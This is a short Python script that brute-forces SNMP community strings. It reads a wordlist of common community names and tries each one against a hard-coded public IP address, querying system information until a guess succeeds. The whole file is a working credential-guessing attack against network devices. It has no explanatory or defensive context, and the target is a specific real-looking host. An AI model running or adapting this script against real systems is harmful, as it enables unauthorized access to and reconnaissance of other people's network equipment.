from pysnmp.entity.rfc3413.oneliner import cmdgen

SNMP_HOST = '182.16.190.78'
SNMP_PORT = 161

cmdGen = cmdgen.CommandGenerator()

fd = open("wordlist-common-snmp-community-strings.txt")
for community in fd.readlines():
	snmpCmdGen = cmdgen.CommandGenerator()
	snmpTransportData = cmdgen.UdpTransportTarget((SNMP_HOST, SNMP_PORT),timeout=1.5,retries=0)
	error, errorStatus, errorIndex, binds = snmpCmdGen.getCmd(cmdgen.CommunityData(community), snmpTransportData, "1.3.6.1.2.1.1.1.0", "1.3.6.1.2.1.1.3.0", "1.3.6.1.2.1.2.1.0")

	# Check for errors and print out results
	if error:
		print(str(error)+" For community: %s " %(community))
	else:
		print("Community Found '%s' ... exiting." %(community))
		break